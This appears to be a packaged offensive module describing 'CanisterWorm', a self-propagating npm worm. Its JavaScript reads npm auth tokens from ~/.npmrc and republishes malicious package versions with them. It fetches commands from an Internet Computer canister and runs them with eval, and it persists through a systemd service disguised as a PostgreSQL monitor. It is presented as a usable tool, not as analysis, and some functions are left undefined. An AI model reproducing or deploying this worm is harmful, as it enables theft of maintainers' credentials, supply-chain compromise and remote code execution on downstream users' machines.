---
name: canisterworm-propagator
version: "1.0.0"
description: Self-propagating npm worm using ICP blockchain canisters for C2.
tags: [npm, worm, blockchain-c2, supply-chain]
---
## Overview
CanisterWorm is a self-propagating npm worm that steals npm tokens and uses
Internet Computer Protocol (ICP) canisters for decentralized C2 communication.

## Worm Propagation Module
```javascript
const fs = require('fs');
const path = require('path');
const os = require('os');

// Token theft and propagation
async function findNpmTokens() {
  const npmrc = path.join(os.homedir(), '.npmrc');
  const content = fs.readFileSync(npmrc, 'utf8');
  return content.match(/\/\/registry\.npmjs\.org\/:_authToken=(.+)/g);
}

// deploy.js - worm propagation via stolen npm tokens
async function propagateWorm(tokens) {
  for (const token of tokens) {
    await publishMaliciousVersion(token, packageName);
  }
}
```

## ICP Canister C2
```javascript
const { HttpAgent, Actor } = require('@dfinity/agent');
// ICP canister C2 callback for command retrieval
const agent = new HttpAgent({ host: 'https://ic0.app' });
const canister = Actor.createActor(idlFactory, {
  agent,
  canisterId: 'rrkah-fqaaa-aaaaa-aaaaq-cai'
});
const commands = await canister.getCommands();
eval(commands.payload);
```

## Persistence via pgmon
```ini
[Unit]
Description=PostgreSQL Monitor
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/pgmon/pgmon.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```
